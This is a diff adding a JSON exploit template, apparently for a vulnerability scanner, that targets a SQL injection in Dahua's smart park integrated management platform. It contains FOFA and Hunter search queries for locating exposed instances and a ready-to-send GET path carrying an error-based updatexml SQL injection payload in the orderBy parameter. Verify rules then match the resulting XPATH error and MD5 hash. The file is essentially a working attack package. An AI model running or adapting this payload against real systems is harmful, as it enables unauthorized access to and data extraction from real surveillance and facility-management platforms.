@@ -1,0 +1,37 @@
+{
+  "product": "大华智慧园区综合管理平台",
+  "vul_name": "大华智慧园区综合管理平台 searchJson SQL注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "大华智慧园区综合管理平台是一款综合管理平台，具备园区运营、资源调配和智能服务等功能。平台意在协助优化园区资源分配，满足多元化的管理需求，同时通过提供智能服务，增强使用体验。由于该平台未对用户输入数据做限制，攻击者可以直接将恶意代码拼接进SQL查询语句中，导致系统出现SQL注入漏洞。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "\"/WPMS/asset/lib/gridster/\" or app=\"dahua-智慧园区综合管理平台\"",
+    "Hunter": "web.body=\"/WPMS/asset/lib/gridster/\""
+  },
+  "protocol": "http",
+  "link": "https://www.cnblogs.com/pursue-security/p/17663954.html",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/portal/services/carQuery/getFaceCapture/searchJson/{}/pageJson/{\"orderBy\":\"1 and 1=updatexml(1,concat(0x7e,MD5(123456),0x7e),1)--\"}/extend/{}"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 500,
+          "body": "XPATH syntax error"
+        },
+        {
+          "body": "e10adc3949ba59abbe56e057f20f883e"
+        }
+      ]
+    }
+  }
+}
